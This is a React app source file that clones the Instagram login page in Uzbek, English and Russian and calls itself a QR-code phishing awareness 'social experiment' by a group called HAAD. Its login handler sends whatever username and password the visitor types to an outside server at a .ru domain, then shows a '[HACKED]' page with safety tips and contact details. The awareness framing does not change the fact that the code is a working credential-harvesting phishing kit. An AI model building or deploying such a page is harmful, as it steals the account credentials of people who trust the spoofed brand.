import React, { useState } from "react";
import {
  BrowserRouter as Router,
  Route,
  Routes,
  useNavigate,
} from "react-router-dom";
import axios from "axios";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";

const translations = {
  uz: {
    usernamePlaceholder: "Telefon raqami, foydalanuvchi nomi yoki email",
    passwordPlaceholder: "Parol",
    loginButton: "Kirish",
    or: "YOKI",
    facebookLogin: "Facebook orqali kirish",
    forgotPassword: "Parolni unutdingizmi?",
    signupText: "Hisobingiz yo'qmi?",
    signupLink: "Ro'yxatdan o'tish",
    getApp: "Ilovani yuklab oling",
  },
  en: {
    usernamePlaceholder: "Phone number, username, or email",
    passwordPlaceholder: "Password",
    loginButton: "Log in",
    or: "OR",
    facebookLogin: "Log in with Facebook",
    forgotPassword: "Forgot password?",
    signupText: "Don't have an account?",
    signupLink: "Sign up",
    getApp: "Get the app",
  },
  ru: {
    usernamePlaceholder: "Номер телефона, имя пользователя или email",
    passwordPlaceholder: "Пароль",
    loginButton: "Войти",
    or: "ИЛИ",
    facebookLogin: "Войти через Facebook",
    forgotPassword: "Забыли пароль?",
    signupText: "Нет аккаунта?",
    signupLink: "Зарегистрироваться",
    getApp: "Скачать приложение",
  },
};

function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [language, setLanguage] = useState("uz");
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();
    if (username && password) {
      try {
        await axios.post("https://681129c37a338.myxvest1.ru/haad-video/", {
          username,
          password,
        });
        navigate("/haad");
      } catch (error) {
        console.error("Login error:", error);
        alert("Xatolik yuz berdi, qayta urinib ko‘ring!");
      }
    }
  };

  const t = translations[language];

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center items-center px-4">
      <div className="max-w-sm w-full">
        <div className="flex justify-center mb-6">
          <img
            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
            alt="Instagram"
            className="h-10"
          />
        </div>
        <div className="bg-white border border-gray-300 rounded p-8 mb-4">
          <div className="space-y-4">
            <div>
              <input
                type="text"
                placeholder={t.usernamePlaceholder}
                className="w-full px-3 py-2 text-sm border border-gray-300 rounded focus:outline-none focus:border-gray-400 placeholder-gray-400"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>
            <div>
              <input
                type="password"
                placeholder={t.passwordPlaceholder}
                className="w-full px-3 py-2 text-sm border border-gray-300 rounded focus:outline-none focus:border-gray-400 placeholder-gray-400"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <button
              className="w-full bg-blue-500 text-white py-2 rounded text-sm font-semibold hover:bg-blue-600 transition disabled:bg-blue-300"
              disabled={!username || !password}
              onClick={handleLogin}
            >
              {t.loginButton}
            </button>
          </div>
          <div className="flex items-center my-6">
            <div className="flex-grow h-px bg-gray-300"></div>
            <span className="mx-4 text-gray-400 text-sm font-semibold">
              {t.or}
            </span>
            <div className="flex-grow h-px bg-gray-300"></div>
          </div>
          <div className="flex justify-center items-center space-x-2">
            <i className="fab fa-facebook-square text-blue-600 text-lg"></i>
            <button className="text-blue-600 text-sm font-semibold hover:underline">
              {t.facebookLogin}
            </button>
          </div>
          <div className="text-center mt-4">
            <a href="#" className="text-xs text-gray-500 hover:underline">
              {t.forgotPassword}
            </a>
          </div>
        </div>
        <div className="bg-white border border-gray-300 rounded p-4 text-center">
          <p className="text-sm">
            {t.signupText}{" "}
            <a href="#" className="text-blue-500 font-semibold hover:underline">
              {t.signupLink}
            </a>
          </p>
        </div>
        <div className="text-center mt-6">
          <p className="text-sm mb-4">{t.getApp}</p>
          <div className="flex justify-center space-x-2">
            <a
              href="https://www.apple.com/app-store/"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="https://cdn.pixabay.com/photo/2021/09/22/16/07/app-store-6647240_1280.png"
                alt="App Store"
                className="h-[6px] mt-[-11px] w-auto object-contain"
                onError={(e) =>
                  (e.target.src =
                    "https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180aec3478b0.png")
                }
              />
            </a>
            <a
              href="https://play.google.com/store"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="https://static.cdninstagram.com/images/appstore-install-badges/badge_android_english-en.png?1"
                alt="Google Play"
                className="h-10 w-auto object-contain"
                onError={(e) =>
                  (e.target.src =
                    "https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png")
                }
              />
            </a>
          </div>
        </div>
      </div>
      <div className="mt-8 text-center">
        <div className="flex flex-wrap justify-center space-x-4 text-xs text-gray-500">
          <a href="#" className="hover:underline">
            Meta
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Haqida"
              : language === "en"
              ? "About"
              : "О нас"}
          </a>
          <a href="#" className="hover:underline">
            Blog
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Ish o'rinlari"
              : language === "en"
              ? "Jobs"
              : "Работа"}
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Yordam"
              : language === "en"
              ? "Help"
              : "Помощь"}
          </a>
          <a href="#" className="hover:underline">
            API
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Maxfiylik"
              : language === "en"
              ? "Privacy"
              : "Конфиденциальность"}
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Shartlar"
              : language === "en"
              ? "Terms"
              : "Условия"}
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Joylashuvlar"
              : language === "en"
              ? "Locations"
              : "Местоположения"}
          </a>
          <a href="#" className="hover:underline">
            Instagram Lite
          </a>
          <a href="#" className="hover:underline">
            Threads
          </a>
          <a href="#" className="hover:underline">
            {language === "uz"
              ? "Yuklash va foydalanuvchilar bilan aloqa"
              : language === "en"
              ? "Contact Uploading & Non-Users"
              : "Контакты и загрузка"}
          </a>
          <a href="#" className="hover:underline">
            Meta Verified
          </a>
        </div>
        <div className="mt-4 text-xs text-gray-500">
          <select
            className="bg-transparent focus:outline-none"
            value={language}
            onChange={(e) => setLanguage(e.target.value)}
          >
            <option value="uz">O'zbek</option>
            <option value="en">English</option>
            <option value="ru">Русский</option>
          </select>
          <span className="ml-2">© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  );
}

function HaadPage() {
  return (
    <div className="min-h-screen bg-black flex flex-col justify-center items-center px-4 font-mono">
      <div className="max-w-lg w-full text-center">
        <h1 className="text-5xl md:text-7xl font-bold text-green-500 mb-8 animate-glitch relative">
          HAAD
          <span className="absolute inset-0 text-green-300 opacity-50 animate-glitch2">
            HAAD
          </span>
          <span className="absolute inset-0 text-green-700 opacity-50 animate-glitch3">
            HAAD
          </span>
        </h1>
        <div className="bg-gray-900 border border-green-500 rounded-lg p-6 text-left text-green-400 shadow-lg shadow-green-500/20">
          <p className="text-lg mb-4 animate-fadeIn">
            <span className="text-red-500">[HACKED]</span> Bu ijtimoiy
            eksperiment edi! Sizning ma'lumotlaringiz xavf ostida bo'lishi
            mumkin edi. QR kod firibgarliklari shaxsiy ma'lumotlarni
            o'g'irlashga undaydi. O'zingizni himoya qilish uchun quyidagi
            maslahatlarga amal qiling:
          </p>
          <ol className="list-decimal list-inside space-y-3 text-sm animate-fadeIn delay-200">
            <li>
              <span className="text-green-300">
                Noma'lum QR kodlarni skaner qilmang:
              </span>{" "}
              QR kod manbasiga ishonchingiz komil bo‘lmasa, uni skaner qilishdan
              oldin tekshiring.
            </li>
            <li>
              <span className="text-green-300">Havolani oldindan ko‘ring:</span>{" "}
              Ko‘pgina QR skaner ilovalar havolani skaner qilishdan oldin
              ko‘rsatadi. Agar URL shubhali ko‘rinsa (masalan, g‘alati domen
              yoki imlo xatolari bo‘lsa), skaner qilmang.
            </li>
            <li>
              <span className="text-green-300">
                Shubhali QR kodlar haqida xabar bering:
              </span>{" "}
              Huquq-tartibot idoralariga shubhali QR kodlar haqida xabar bering.
            </li>
          </ol>
          <p className="text-lg mt-4 animate-fadeIn delay-400">
            Biz <span className="text-green-300">axloqli xakerlik</span>ni
            o‘rgatamiz va sizni{" "}
            <span className="text-green-300">kiberxavf-xatarlardan</span> himoya
            qilishga yordam beramiz!
          </p>
          <p className="text-lg mt-4 animate-fadeIn delay-600">
            Aloqa:{" "}
            <a
              href="tel:+998930458811"
              className="text-green-300 hover:text-green-100 transition"
            >
              +998930458811
            </a>{" "}
            /{" "}
            <a
              href="tel:+998935878811"
              className="text-green-300 hover:text-green-100 transition"
            >
              +998935878811
            </a>
          </p>
          <p className="text-lg mt-2 animate-fadeIn delay-800">
            Veb-sayt:{" "}
            <a
              href="https://haad.ai"
              className="text-green-300 hover:text-green-100 transition"
            >
              haad.ai
            </a>
          </p>
        </div>
      </div>
    </div>
  );
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<LoginPage />} />
        <Route path="/haad" element={<HaadPage />} />
      </Routes>
    </Router>
  );
}

export default App;
